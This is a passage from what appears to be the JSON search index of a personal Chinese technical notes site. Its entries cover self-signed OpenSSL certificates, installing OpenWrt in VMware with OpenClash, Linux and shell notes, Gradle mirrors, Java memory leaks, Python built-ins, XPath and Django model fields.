生成rsa私钥，des3算法，1024位强度，ssl.key是秘钥文件名: openssl genrsa -des3 -out ssl.key 1024 根据提示输入密码。当前文件夹下生成一个 ssl.key 文件。 删除密码, 这里目录和生成私钥的目录一致: openssl rsa -in ssl.key -out ssl.key 生成 CSR（证书签名请求）. 根据根据刚刚生成的 key 文件来生成证书请求文件: openssl req -new -key ssl.key -out ssl.csr 依次输入国家、地区、城市、组织、组织单位、Common Name、Email 和密码。\n其中 Common Name 应该与域名保持一致。密码我们已经删掉了,直接回车即可。 注解 Common Name 就是证书对应的域名地址，我们开发微信小程序时必须要让我们的外链的 https 的域名和证书统一才行。 生成自签名证书。根据以上 2 个文件生成 crt 证书文件，终端执行下面命令: openssl x509 -req -days 3650 -in ssl.csr -signkey ssl.key -out ssl.crt 这里3650是证书有效期(单位：天)。这个大家随意。最后使用到的文件是key和crt文件。\n到这里我们的证书(ssl.key 和 ssl.crt) 就已经创建成功了可以直接用到 https 的 server 中了。 在代码中使用证书: https\n    .createServer(\n        {\n            key: fs.readFileSync(\"./cert_key/ssl.key\"),\n            cert: fs.readFileSync(\"./cert_key/ssl.crt\")\n        },\n        app\n    )\n    .listen(1993); 详情介绍 见: openssl","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-openssl.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-openssl.html"},{"title":"相关算法","text":"RSA算法","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-openssl-Related-algorithm-index.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-openssl-Related-algorithm-index.html"},{"title":"openssl","text":"相关算法 一些问题说明","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-openssl-index.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-openssl-index.html"},{"title":"VMware安裝OpenWrt","text":"官网下载地址 因为我是虚拟机安装, 系统是64位, 所以就只看这个页面的: https://downloads.openwrt.org/releases/23.05.2/targets/x86/64/ 或者通用版也行: https://downloads.openwrt.org/releases/23.05.2/targets/x86/generic/ , 二选一即可 直接选组合包吧: 区别: ext4      rootfs可以扩展磁盘空间大小，而squashfs不能。\nsquashfs  rootfs可以使用重置功能（恢复出厂设置），而ext4不能。 虚拟机创建环境 先不安装操作系统, 选择linux 自由选择名称, 位置: 处理器给一个就行 内存默认即可(要多给也行) 网络选择桥接(这里就是使用VM的好处, 如果用docker配置地址比较麻烦) 注解 桥接模式 VMware桥接模式，也就是将虚拟机的虚拟网络适配器与主机的物理网络适配器进行交接，\n虚拟机中的虚拟网络适配器可通过主机中的物理网络适配器直接访问到外部网络。\n简而言之，这就好像局域网中添加了一台新的、独立的计算机一样。\n因此，虚拟机也会占用局域网中的一个IP地址，并且可以和其他终端进行相互访问。 NAT模式 NAT，是Network Address Translation的缩写，意即网络地址转换。\nNAT模式也是VMware创建虚拟机的默认网络连接模式。\n使用NAT模式网络连接时，VMware会在主机上建立单独的专用网络，用以在主机和虚拟机之间相互通信。 仅主机模式 仅主机模式，是一种比NAT模式更加封闭的的网络连接模式，它将创建完全包含在主机中的专用网络。\n仅主机模式的虚拟网络适配器仅对主机可见，并在虚拟机和主机系统之间提供网络连接。\n相对于NAT模式而言，仅主机模式不具备NAT功能，因此在默认情况下，\n使用仅主机模式网络连接的虚拟机无法连接到Internet\n(在主机上安装合适的路由或代理软件，或者在Windows系统的主机上使用Internet连接共享功能，\n仍然可以让虚拟机连接到Internet或其他网络)。 控制器默认即可,\n磁盘选择使用 StarWindConverter 转换的虚拟机文件(需要保持现有格式): 后续看需求了, 直到 选择自定义硬件 没用的都可以去掉 注解 这里补充一下, 下载的 img 的压缩包, 需要先转换为ISO文件 我这里使用的是WSL, 直接在cmd输入debian即可,\n然后配置源, 可参考 配置debian容器 最后使用 genisoimage 指令: # 进入解压目录\ncd /mnt/e/xxxxxxxxxxx/openwrt-23.05.2-x86-generic-generic-ext4-combined.img\ngeteltorito -o output_file.iso input_file.img 不行, 缺少库, 还是直接用我虚拟机弄吧... genisoimage -o openwrt.iso openwrt-23.05.2-x86-generic-generic-ext4-combined.img 实测直接转换的iso是不能用的, 还是老老实实使用工具 StarWindConverter 吧 然后打开虚拟机, 会安装一会儿, 出现 ready 后回车即可: 物理机 ipconfig 查看网络信息 虚拟机配置网络: vi /etc/config/network 这是默认配置 按照物理机修改, 需要跟物理机同网段 重启虚拟机: reboot 然后宿主机(物理机) 看看通不: ping 登录虚拟机的系统, 地址: 192.168.1.80 默认账密: root\nnetflixcn.com 设置旁路由 随后打开「网络」->「接口」配置页面，选择 LAN 接口 LAN 接口的桥接选项取消勾选 DHCP 服务器勾选「忽略此接口」 打开「网络」-> 「设备」页面 eth0网卡配置取消勾选「启用 IPv6」 br-lan接口同样取消启用「启用IPv6」 安装 openclash 两种方式可以选择 直接在 openwrt 的「系统」-「软件包」中搜索下载 在openclash的官方仓库下载 ipk 安装包，手动上传安装 插件设置 个人习惯，倾向于使用 Fake-IP 模式。 步骤： 模式使用 Fake-IP（增强）模式，打开旁路由兼容 本地 DNS劫持，使用 dnsmasq 转发 PS.模式也推荐使用 TUN ，\n该模式下的UDP 处理性能更好，同时新增了 tun 虚拟接口，可以监管三层网络流量。 使用 至此，旁路由已经具备网络代理的功能。\n家里的设备需要使用的话，需要将网络设置的ip 的网关和 DNS都指向旁路由的地址即可。\nDNS的域名解析工作交给旁路由来处理，避免 DNS污染的问题。 参考: VMware安装openWRT软路由系统的步骤(图文教程) 通过Docker部署OpenWrt做家用旁路由","tags":"操作系统","url":"/yq-docs-operating-system-linux-Openwrt-Vmware-install-OpenWrt.html","loc":"/yq-docs-operating-system-linux-Openwrt-Vmware-install-OpenWrt.html"},{"title":"OpenWrt","text":"一个嵌入式 Linux, 主要实现路由功能 简单来说，OpenWRT 是一款家用路由器的操作系统，路由器安装了它才能正常的工作。\n就像国内手机厂商基于开源的 Android 系统开发出各种 Rom一样。\n路由器厂商也可以基于 OpenWRT 这个平台，进行二次开发，增加更多丰富的功能和有厂商特色的路由器系统。 VMware安裝OpenWrt 官网: https://openwrt.org/ 参考: VMware安装openWRT软路由系统的步骤(图文教程)","tags":"操作系统","url":"/yq-docs-operating-system-linux-Openwrt-index.html","loc":"/yq-docs-operating-system-linux-Openwrt-index.html"},{"title":"在 Linux 下使用 RAID","text":"RAID 的级别和概念 使用 mdadm 工具创建软件 RAID 0 (条带化) 用两块磁盘创建 RAID 1 (镜像) 创建 RAID 5 (条带化与分布式奇偶校验) 安装 RAID 6 (条带化双分布式奇偶校验) 设置 RAID 10 或 1 + 0 (嵌套) 在 RAID 中扩展现有的 RAID 阵列和删除故障的磁盘 当软件 RAID 故障时如何恢复和重建数据 如何使用 Mdadm 工具管理软件 RAID","tags":"操作系统","url":"/yq-docs-operating-system-linux-Tutorial-Raid-index.html","loc":"/yq-docs-operating-system-linux-Tutorial-Raid-index.html"},{"title":"教程","text":"shell语法规范 gnome文件管理器内添加右键菜单 debian-ubuntu字体说明 linux下配置DLAN服务 本地构建deb包 RAID 硬盘分区配置 快捷键","tags":"操作系统","url":"/yq-docs-operating-system-linux-Tutorial-index.html","loc":"/yq-docs-operating-system-linux-Tutorial-index.html"},{"title":"shell语法规范","text":"case语句 语法如下: case 值 in\n    模式1)\n        命令序列1\n        ;;\n    模式2)\n        命令序列2\n        ;;\n    ...\n    *)\n        默认命令序列\n        ;;\nesac 值 是需要匹配的表达式或变量。 模式 是用来匹配值的模式，可以使用通配符。 命令序列 是当匹配到相应模式时要执行的一组命令。 ;; 表示一个模式块的结束，类似于break语句，用于跳出case语句;\n如果不加;;，Shell会继续往下执行后续模式的命令序列，而不进行匹配 *) 是可选的默认模式，如果没有匹配到任何模式，将执行对应的命令序列;\n默认模式通常放在最后，用于处理未匹配到任何模式的情况 其他: shell语法规范","tags":"操作系统","url":"/yq-docs-operating-system-linux-Tutorial-shell-grammar-specification.html","loc":"/yq-docs-operating-system-linux-Tutorial-shell-grammar-specification.html"},{"title":"shell语法规范","text":"shell条件判断if shell的变量替换 shell退出状态码 Linux各种$ 逻辑与 Shell传递参数 Shell循环 Shell的return 引号 文件读取 bash数组 一些bug shell下while与set","tags":"操作系统","url":"/yq-docs-operating-system-linux-Tutorial-shell-grammar-specification-index.html","loc":"/yq-docs-operating-system-linux-Tutorial-shell-grammar-specification-index.html"},{"title":"设置默认文本编辑器","text":"Debian有许多不同的编辑器。\n我们建议安装上面提到的 vim 软件包。\nDebian通过命令 /usr/bin/editor 提供了对系统默认编辑器的统一访问，\n因此其它程序（例如 reportbug ）可以调用它。\n你可以通过下列命令改变它: $ sudo update-alternatives --config editor 对于新手，我建议使用 /usr/bin/vim.basic 代替 /usr/bin/vim.tiny ，因为它支持格式高亮。 注解 许多程序使用环境变量 $EDITOR 或 $VISUAL 来决定使用那个编辑器.\n出于 Debian 系统的一致性考虑，它们被设置到 /usr/bin/editor 。\n（在历史上， $EDITOR 是 ed ， $VISUAL 是 vi 。)","tags":"操作系统","url":"/yq-docs-operating-system-linux-debian-DEBIAN-manual-Set-the-default-text-editor.html","loc":"/yq-docs-operating-system-linux-debian-DEBIAN-manual-Set-the-default-text-editor.html"},{"title":"debian手册","text":"参考: https://www.debian.org/doc/manuals/debian-reference/ PS1 提示符定义 类 Unix 文件系统 三种类型的时间戳 套接字 设备文件 熵 随机数 procfs 和 sysfs 特殊按键 设置默认文本编辑器 记录 shell 活动","tags":"操作系统","url":"/yq-docs-operating-system-linux-debian-DEBIAN-manual-index.html","loc":"/yq-docs-operating-system-linux-debian-DEBIAN-manual-index.html"},{"title":"Debian","text":"Debian包依赖 debian查看系统版本 debian一些了解 debian手册 debian启动 配置debian容器","tags":"操作系统","url":"/yq-docs-operating-system-linux-debian-index.html","loc":"/yq-docs-operating-system-linux-debian-index.html"},{"title":"Linux","text":"debian 系统服务 教程 Linux环境变量 概念性 问题 网络 linux指令 ubuntu package 一些安全相关文件 一些常见发行版下载 配置文件 内置函数 OpenWrt iStoreOS CasaOS home-assistant 分区说明 主分区, 最多有四个 逻辑分区, 一种特殊类型的分区, 解决主分区最多只有四个的问题 拓展分区, 主要作为 逻辑分区 的 容器 , 本身 不能直接挂载 常用查询指令 uptime top w iotop","tags":"操作系统","url":"/yq-docs-operating-system-linux-index.html","loc":"/yq-docs-operating-system-linux-index.html"},{"title":"Linux网络","text":"网络管理","tags":"操作系统","url":"/yq-docs-operating-system-linux-network-index.html","loc":"/yq-docs-operating-system-linux-network-index.html"},{"title":"package","text":"bind9软件包 gitg xclip","tags":"操作系统","url":"/yq-docs-operating-system-linux-package-index.html","loc":"/yq-docs-operating-system-linux-package-index.html"},{"title":"问题","text":"ssh重置计数器 单次任务 定时任务 谁在系统 警告所有人 二进制数据访问 root密码忘记 Linux的一些内核参数 获取所有变量与环境变量 进程暂停与挂起 linux参数过长 debian10 iptables-restore 的 bug 记录一次Ubuntu的DNS解析问题 关于 #! 表示当作为执行文件的时候，使用解释器路径，默认为当前登录shell 必须写在第一行才有用 当执行执行文件时，cd到所在目录后，执行需要加 ./ ，    ./test的./是为了承接现在所在的文件夹，\n让现在所在的文件夹+文件，合并成该文件的完整路径，用于执行。 优先级 当直接指定解释器的时候 比如 python xxx.py， xxx.py文件里的 #! 是不生效的， 只有作为执行文件的时候才会生效，比如  ./xxx.py 文件 登陆日志查看: /var/log/auth.log\n/var/log/secure.log 其他日志: /var/log/message  一般信息和系统信息\n/var/log/secure  登陆信息\n/var/log/maillog  mail记录\n/var/log/utmp\n/var/log/wtmp    登陆记录信息（last命令即读取此日志或者 who /var/log/wtmp） Ubuntu执行sudo慢 解决, 查看主机名, 然后增加到 /etc/hosts $ hostname\nyanqueubuntuserver\n$ cat /etc/hosts 127 .0.0.1 localhost 127 .0.0.1 yanqueubuntuserver 原因 Ubuntu Server 被设计成一种类似于分布式的操作系统网结构，允许 /etc/sudoers 中的成员不在本机上。\n从而 sudo 时会先从网络上寻找可能的 sudoer 然后才是本地.\n因而会多出本地网络查找的时间","tags":"操作系统","url":"/yq-docs-operating-system-linux-question-index.html","loc":"/yq-docs-operating-system-linux-question-index.html"},{"title":"系统服务","text":"PAM模块 auditd 认证和访问控制 ACL权限控制 内核模块 SSH 国际化和本地化 rsyslog crontab服务 ntp服务","tags":"操作系统","url":"/yq-docs-operating-system-linux-system-service-index.html","loc":"/yq-docs-operating-system-linux-system-service-index.html"},{"title":"Ubuntu","text":"图形界面 ubuntu中文支持","tags":"操作系统","url":"/yq-docs-operating-system-linux-ubuntu-index.html","loc":"/yq-docs-operating-system-linux-ubuntu-index.html"},{"title":"c库函数","text":"fflush printf与sprintf","tags":"后端","url":"/yq-docs-rear-end-from-C-library-function-index.html","loc":"/yq-docs-rear-end-from-C-library-function-index.html"},{"title":"c标准库","text":"./string-h","tags":"后端","url":"/yq-docs-rear-end-from-Standard-library-index.html","loc":"/yq-docs-rear-end-from-Standard-library-index.html"},{"title":"C","text":"c++ cmake cmakelists编写 c类型 c库函数 标准库 gcc(++)编译器 vscode调试相关 使用CLion 基础知识 一些关键字 问题","tags":"后端","url":"/yq-docs-rear-end-from-index.html","loc":"/yq-docs-rear-end-from-index.html"},{"title":"关于库的报错","text":"对于使用Nuitka编译的Python代码而言, 也适用, 因为最终还是先转换为C再编译. 尤其易出现的跨系统场景, 比如在Ubuntu16编译的方法哦Ubuntu20上去跑. 以自己经历的一个场景而言, 主要业务代码是用Python编码, 使用了自己编写的C库(一个跨平台的GUI库)的动态链接.\n在 Ubuntu16 编译的时候, 使用了16的 libpng.so .\n放到 Ubuntu18 与 Ubuntu20 上运行时, 由调用了各自系统的 libpng.so .\n且18与20的 libpng 又依赖于 libz.so 的 1.2.9 版本.\n而16上是仅依赖于 libz.so 的 1.2.3.4 版本. 这里使用Nuitka编译的时候, 发现自动把16的 libz.so 给放进去了, 就出现了报错: libz.so.1: version `ZLIB_1.2.9' not found (required by /lib/x86xxxxxx/libpng.so) 把应用下的 libz.so.1 给删除了, 遇到另一个库的报错: libxcb-shm.so.0 undefined symbol 应用程序下是有另一个库 libxcb.so.1 , 这里实际是由应用程序下的 libxcb.so.1 调了系统的 libxcb-shm.so.0 ,\n真实原因就是两者版本不一致. 这里的不一致是指, libxcb.so.1 与 libxcb-shm.so.0 理应都是属于 libxcb 的共享库, 但是Nuitka处理的时候,\n只处理了一部分(只把 libxcb-shm.so.0 给复制到应用程序目录下) 最终把应用程序下的 libxcb.so.1 删除即可. 最后料想, 是否一开始就将 Ubuntu16 的 libpng.so 搞到应用程序下面, 就不会有问题, 但是奈何... 就没有尝试. 注解 一些可以尝试的指令: ldd , 查看贡献库的依赖项(链接项),\n注意这里的依赖, 如果应用程序目录下存在, 会优先使用应用程序下有的 strings , 查看此共享库依赖的具体版本","tags":"后端","url":"/yq-docs-rear-end-from-question-About-library-error.html","loc":"/yq-docs-rear-end-from-question-About-library-error.html"},{"title":"编辑器长字符串多行写","text":"字符串拼接来创建跨多行的字符串: char *data = \"it is\"\n             \"a test msg\"","tags":"后端","url":"/yq-docs-rear-end-from-question-Editor's-long-string-is-written-in-multiple-lines.html","loc":"/yq-docs-rear-end-from-question-Editor's-long-string-is-written-in-multiple-lines.html"},{"title":"枚举类型值的问题","text":"定义一个枚举: enum LANGUAGE_TYPE {\n    EN = 0,\n    ZH_CH,\n}; 如果没有赋值: enum LANGUAGE_TYPE current_language; 那么默认值就是第一个 EN","tags":"后端","url":"/yq-docs-rear-end-from-question-Enumeration-type.html","loc":"/yq-docs-rear-end-from-question-Enumeration-type.html"},{"title":"函数参数void","text":"定义函数时修饰函数表示无返回值, 作为参数时候表示不接受参数: int fun(void) 而不使用表示接受任意不确定类型参数: int fun()","tags":"后端","url":"/yq-docs-rear-end-from-question-Function-parameter-VOID.html","loc":"/yq-docs-rear-end-from-question-Function-parameter-VOID.html"},{"title":"Windows下长路径删除/重命名","text":"","tags":"后端","url":"/yq-docs-rear-end-from-question-Long--distance-operation.html","loc":"/yq-docs-rear-end-from-question-Long--distance-operation.html"},{"title":"问题-C","text":"枚举类型 函数参数void 编辑器长字符串多行写 关于库的报错 长路径操作","tags":"后端","url":"/yq-docs-rear-end-from-question-index.html","loc":"/yq-docs-rear-end-from-question-index.html"},{"title":"安卓开发","text":"相关教程可参考w3school的: https://www.w3cschool.cn/uawnhh/qbe84ozt.html 资源文件介绍","tags":"后端","url":"/yq-docs-rear-end-java-Android-development-index.html","loc":"/yq-docs-rear-end-java-Android-development-index.html"},{"title":"构建工具","text":"构建工具","tags":"后端","url":"/yq-docs-rear-end-java-Build-tools.html","loc":"/yq-docs-rear-end-java-Build-tools.html"},{"title":"Gradle","text":"官网: https://gradle.org 重要 目前为止, 此文档编写时, 使用版本为 Gradle-8.1.1 安装 Mac可以直接使用homebrew: brew install gradle 安装会下载很多依赖包, 不懂Mac为啥要下载这么多依赖包, 我的安装路径是在: /usr/local/Cellar/gradle/8.1.1 可能会有需要安装Java, 可参考 安装 然后在Android Studio里面自定义Gradle路径的时候不知道为啥就直接是: /usr/local/Cellar/gradle/8.1.1/libexec Android Studio中设置位置 所有版本: https://gradle.org/releases/ 若需要设置Gradle仓库的环境变量, 设置: export GRADLE_USER_HOME=... 注解 若下载的是解压包, 需要手动解压到相关位置, 如: $ mkdir /opt/gradle\n$ unzip -d /opt/gradle gradle-8.1.1-bin.zip\n$ ls /opt/gradle/gradle-8.1.1\nLICENSE  NOTICE  bin  getting-started.html  init.d  lib  media 警告 若使用Mac brew安装, 需要提前配置好JAVA环境, 可参考 安装 ,\n若是后配置好JAVA, 需要先brew卸载后再装.\n(最主要的就是跟系统的 /usr/bin/java 对应起来, 否则即使配置的正确的JAVA_HOME, 也会有问题) 所以我选择解压包方便. 配置系统环境 Linux/Mac, 以安装到 /opt/gradle/gradle-8.1.1 为例: # GRADLE_HOME 官网安装文档并未要求设置\nGRADLE_HOME=/opt/gradle/gradle-8.1.1\nexport PATH=$PATH:$GRADLE_HOME/bin Windows直接在PATH环境变量新增一个即可. 配置镜像源 有两种选择 .gradle 目录通常被设置为环境变量 GRADLE_USER_HOME 全局配置, 用户目录下新建 .gradle 目录, 项目配置, 在项目下的 settings.gradle\n增加源地址: pluginManagement {\n    repositories {\n\n        maven { url 'https://maven.aliyun.com/repository/public/' }\n        maven { url 'https://maven.aliyun.com/repository/google/' }\n        maven { url 'https://maven.aliyun.com/repository/jcenter/' }\n        maven { url 'https://maven.aliyun.com/repository/central/' }\n\n        google()\n        mavenCentral()\n        gradlePluginPortal()\n    }\n}\ndependencyResolutionManagement {\n    repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)\n    repositories {\n\n        maven { url 'https://maven.aliyun.com/repository/public/' }\n        maven { url 'https://maven.aliyun.com/repository/google/' }\n        maven { url 'https://maven.aliyun.com/repository/jcenter/' }\n        maven { url 'https://maven.aliyun.com/repository/central/' }\n\n        google()\n        mavenCentral()\n    }\n}\nrootProject.name = \"hello\"\ninclude ':app' 详细说明/介绍 gradle","tags":"后端","url":"/yq-docs-rear-end-java-Build-tools-Gradle.html","loc":"/yq-docs-rear-end-java-Build-tools-Gradle.html"},{"title":"Gradle","text":"配置文件说明 相关环境变量说明 Gradle项目初始化下载慢 Android-Gradle项目初始化构建时, 下载 gradle-7.5-bin.zip 慢的问题 修改 gradle-wrapper.properties 文件,\n我的在 gradle/wrapper/gradle-wrapper.properties ,\n找不到就全局搜一下,\n将原本的: distributionUrl=https\\://services.gradle.org/distributions/gradle-7.5-bin.zip 更改为镜像代理地址路径(这里用的腾讯的): distributionUrl=https\\://mirrors.cloud.tencent.com/gradle/gradle-7.5-bin.zip 具体位置可以进去腾讯代理地址自己找找: https://mirrors.cloud.tencent.com/ 修改后","tags":"后端","url":"/yq-docs-rear-end-java-Build-tools-Gradle-index.html","loc":"/yq-docs-rear-end-java-Build-tools-Gradle-index.html"},{"title":"构建工具","text":"gradle maven","tags":"后端","url":"/yq-docs-rear-end-java-Build-tools-index.html","loc":"/yq-docs-rear-end-java-Build-tools-index.html"},{"title":"Java","text":"安装 编译执行 构建工具 一些备忘 IDEA配置Gradle项目 IO模型 DDD 安卓开发 安卓开发 内存泄漏与内存溢出 内存溢出 JVM内存有限。如果对象太多，JVM内存放不下了，就会内存溢出。 内存泄漏 JVM的垃圾回收只会回首引用计数为0的对象,\n如果存在循环引用, 或者没有及时回收调用, 就会一直存在 如下代码中，obj的值是null，因此是\"无用的\"；\n但同时obj又同时被被list引用，因此是\"可达\"的，所以此时的obj就会造成内存泄漏。: Object obj = new Object();\nlist.add( obj );\nobj = null ; 除了上面obj这种内存泄漏的情况以外，\n在实际开发中最常见的内存泄漏就是打开资源后没有调用close()方法。\n例如socket、io流等，都需要再最后close()一下防止内存泄漏。","tags":"后端","url":"/yq-docs-rear-end-java-index.html","loc":"/yq-docs-rear-end-java-index.html"},{"title":"内置函数","text":"__import__ __init__ __str__ any async_for bytearray chr cmp dict divmod enumerate filter format getattr isinstance iter list locals map max min open ord print round set slice sorted str,repr str type vars with zip pow","tags":"后端; python","url":"/yq-docs-rear-end-python-Built--in-function-index.html","loc":"/yq-docs-rear-end-python-Built--in-function-index.html"},{"title":"Python一些内置函数/属性","text":"__file__ 一般是Python编码模块使用, 表示模块所在路径, 如获取json模块所在路径: >>> import json\n>>>\n>>> json.__file__\n'/usr/local/Cellar/python@3.9/3.9.10/Frameworks/Python.framework/Versions/3.9/lib/python3.9/json/__init__.py'\n>>> dir() dir([object]) dir() 函数不带参数时，返回当前范围内的变量、方法和定义的类型列表； 带参数时，返回参数的属性、方法列表。 如果参数包含方法__dir__()，该方法将被调用。 如果参数不包含__dir__()，该方法将最大限度地收集参数信息。 object: 对象、变量、类型。 exec() 将字符串当作代码执行 def exec(__source: str | bytes | CodeType, __globals: dict[str, Any] | None = ..., __locals: Mapping[str, Any] | None = ...) -> Any __source: 需要执行的字符串 __globals: 全局变量字典 __locals: 局部变量字典 将字符串作为Python代码执行,不返回任何结果。 可以执行跨越多行的代码块,支持变量赋值、函数定义等全面的Python代码。 如果字符串不是合法的Python代码,仍然会引发SyntaxError。 eval() 将字符串作为表达式执行,并返回结果。 仅能执行单个表达式,不能为变量赋值。 字符串必须是合法的Python表达式,否则会引发SyntaxError。 其他内置函数 ../内置函数","tags":"后端; python","url":"/yq-docs-rear-end-python-Concept-Some-built--in-functions-or-attributes.html","loc":"/yq-docs-rear-end-python-Concept-Some-built--in-functions-or-attributes.html"},{"title":"概念相关","text":"Python中进制 Python的编码 Python线程池及其原理 object类 python导入说明 python虚拟环境 python命令选项与参数 包,模块结构 对super的理解 元类 协程 迭代 多线程-线程池 多线程 多进程 装饰器 字典操作 特殊字符 进程与线程 一些使用技巧,说明 字符串前面加u,r,b的含义 一些内置函数或属性","tags":"后端; python","url":"/yq-docs-rear-end-python-Concept-index.html","loc":"/yq-docs-rear-end-python-Concept-index.html"},{"title":"Python性能分析","text":"查了一下, 主要的有以下几种 cProfile: Python标准库中内置的性能分析模块，非侵入式.\ncProfile生成的结果可以进一步导出成火焰图 line_profiler: 主要做函数内每行语句的性能分析，需要侵入代码.\n如果已经知道哪个函数是瓶颈，需要对函数进一步分析，可以使用这个. pyflame: 只能生成火焰图. pyinstrument: 使用采样方法对函数的执行时间进行记录，开销比cProfile要小. cProfile pyflame","tags":"后端; python","url":"/yq-docs-rear-end-python-Performance-analysis-index.html","loc":"/yq-docs-rear-end-python-Performance-analysis-index.html"},{"title":"相关技术实现","text":"OCR识别 获取win下管理员权限 判断是否为类方法 在一个Python环境使用另一个Python环境的包","tags":"后端; python","url":"/yq-docs-rear-end-python-Related-technology-implementation-index.html","loc":"/yq-docs-rear-end-python-Related-technology-implementation-index.html"},{"title":"XPath 教程","text":"参考: 菜鸟-XPath XPath 是一门在 XML 文档中查找信息的语言。 在学习之前应该具备的知识： HTML / XHTML XML / XML Namespaces 什么是 XPath ? XPath 使用路径表达式在 XML 文档中进行导航 XPath 使用路径表达式来选取 XML 文档中的节点或者节点集。这些路径表达式和我们在常规的电脑文件系统中看到的表达式非常相似。 Path 包含一个标准函数库 XPath 含有超过 100 个内建的函数。这些函数用于字符串值、数值、日期和时间比较、节点和 QName 处理、序列处理、逻辑值等等。 XPath 是 XSLT 中的主要元素 XPath 是 XSLT 标准中的主要元素。如果没有 XPath 方面的知识，您就无法创建 XSLT 文档。\n您可以在我们的 《XSLT 教程》 中阅读更多的内容。\nXQuery 和 XPointer 均构建于 XPath 表达式之上。XQuery 1.0 和 XPath 2.0 共享相同的数据模型，并支持相同的函数和运算符。\n您可以在我们的 《XQuery 教程》 中阅读更多有关 XQuery 的知识。 XPath 是一个 W3C 标准 XPath 于 1999 年 11 月 16 日 成为 W3C 标准。\nXPath 被设计为供 XSLT、XPointer 以及其他 XML 解析软件使用。\n您可以在我们的 《W3C 教程》 中阅读更多有关 XPath 标准的信息。 XPath节点 XPath语法 XPath轴 XPath运算符 实例 相关 XSLT XSLT 是针对 XML 文件的样式表语言。\n通过 XSLT，您可以把 XML 文件转换为其他的格式，比如 XHTML。\n如果您希望学习更多有关 XSLT 的知识，请访问我们的 《XSLT 教程》 。 XQuery XQuery 和 XML 数据查询有关。\nXQuery 被设计用来查询任何可作为 XML 形态呈现的数据，包括数据库。\n如果您希望学习更多有关 XQuery 的知识，请访问我们的 《XQuery 教程》 。 XLink 和 XPointer XML 中的链接被分为两个部分：XLink 和 XPointer。\nXLink 和 XPointer 定义了在 XML 文档中创建超级链接的标准方法。\n如果你希望学习更多有关 XLink 和 XPointer 的知识，请访问我们的 《XLink 教程和 XPointer教程》 。","tags":"后端; python","url":"/yq-docs-rear-end-python-Tutorial-XPath-index.html","loc":"/yq-docs-rear-end-python-Tutorial-XPath-index.html"},{"title":"教程","text":"高级python Pytest debug版本python安装 多个目录下的三方包整合 从源码安装 Python网络编程 GUI开发之QT 利用反射实例对象 使用python下载文件 自制pip包 生成随机字符串 xpath toml文件操作","tags":"后端; python","url":"/yq-docs-rear-end-python-Tutorial-index.html","loc":"/yq-docs-rear-end-python-Tutorial-index.html"},{"title":"模型模块module","text":"总览: module.objects.all() 获取该实例的所有信息\nmodule.objects.add() 添加\nmodule.objects.create() 创建\nmodule.objects.get()\nmodule.objects.filter(**kargs) 过滤器 返回包含指定参数的QuerySet\nmodule.objects.exclude(**kargs) 返回不包含指定参数的QuerySet\nmodule.objects.annotate()\nmodule.objects.order_by() 排序\nmodule.objects.annotate()\nmodule.objects.alias() 模型类 模型定义 每个模型都是python的一个类，且需继承 django.db.models.Model\n类下每个属性都相当于一个数据库字段 每当新建一个模型的时候，都需要在 setting.py下的  INSTALL_APPS 配置，如\n新建 app: python manage.py start myapp 配置app: INSTALL_APPS = [\n  'myapp'\n] 将变更好的内容写入数据库: # 查找所有可用的模型 为任意一个在数据库中不存在对应数据表的模型创建迁移脚本文件\npython manage.py makemigrations\n\n# 将变更写入数据库\npython manage.py migrate 模型中的字段类型 https://docs.djangoproject.com/zh-hans/3.2/ref/models/fields/#model-field-types 模型中的字段选项, 关于类中的字段,\n每个字段都应该是 Field 类的实例 支持的Field 参考: Django模型字段 字段选项，部分解释 max_length 指定该字段长度 db_index True表示将为此字段建索引 default 该字段的默认值 。可以是可调用对象，但是默认不可变 primary_key 为True时，表示将该字段设置为主键。同时表示 null=False 和 unique=True , 如果该模型中一个主键都没有设置，那么将会自动添加一个字段来设置主键。\n主键字段是只读的。如果改变了现有对象的主键值，然后将其保存，则会在旧对象旁边创建一个新对象。 verbose_name 该字段的含义, 字段备注名（相当于给他一个注释） unique 设置为True，表示字段必须在整个表中保持值唯一。属于数据库级别和模型验证中强制执行。 unique_for_date 将其设置为 DateField 或 DateTimeField 的名称，要求该字段的日期字段值是唯一的。 unique_for_month 与上一个一致，区别为要求月份唯一 unique_for_year 要求年份唯一 null 如果设置为True，表示当该字段为空时，Django会将数据库中该字段设置为NULL。默认False blank 默认False。True表示该字段允许为空。 与null的区别是，null仅表示数据库层面的空，而 blank涉及表单验证，为Flase表示表单该字段必填 db_column 字段使用的数据库列名，未指定时使用数据库名 db_tablespace 如果这个字段有索引，那么要为这个字段的索引使用的 数据库表空间 的名称。 默认是项目的 DEFAULT_INDEX_TABLESPACE （如果有设置）,或者是模型的 db_tablespace （如果有）。\n如果后端不支持索引的表空间，则忽略此选项。 这里其实没搞懂为啥索引也有表空间，搜了一下暂时没得到答案 mysql的表空间使用 editable 默认为True。 False表示该字段不会在管理或者任何其他地方中显示 error_messages 覆盖该字段引发的默认消息。传入一个与你想覆盖的错误信息相匹配的键值的字典。 这里也没懂啥意思 -_- ，可参考 error_messages help_text 额外的帮助文档，随表单控件一起显示。即便字段未用与表单，对于生成文档也可用。 这个也没懂 &#94;_&#94; validators 要为该字段运行的验证器列表。更多信息请参见 验证器文档 这个有点深，表示自定义验证机制 choices 一系列二元数组，在表单上表示为选择框 如，一个选项列表: from django.db import models\n\nclass Person(models.Model):\n    # 一个选项列表\n    SHIRT_SIZES = (\n        ('S', 'Small'),\n        ('M', 'Medium'),\n        ('L', 'Large'),\n    )\n    name = models.CharField(max_length=60)\n    shirt_size = models.CharField(max_length=1, choices=SHIRT_SIZES) 注意，当choices的顺序变动时，将创建新的迁移 当代码包含此字段时，可以使用 get_定义值_dispaly 来获取响应的结果，如: >>> p = Person(name=\"Fred Flintstone\", shirt_size=\"L\")\n>>> p.save()\n>>> p.shirt_size\n'L'\n>>> p.get_shirt_size_display()\n'Large' through 仅用于多对多字段中, 指定使用哪个模型","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Django-Module-Module.html","loc":"/yq-docs-rear-end-python-Web-framework-Django-Module-Module.html"},{"title":"Django支持的Field","text":"AutoField BigAutoField BigIntegerField BinaryField BooleanField CharField DateField DateTimeField DecimalField DurationField EmailField FieldFile FileField 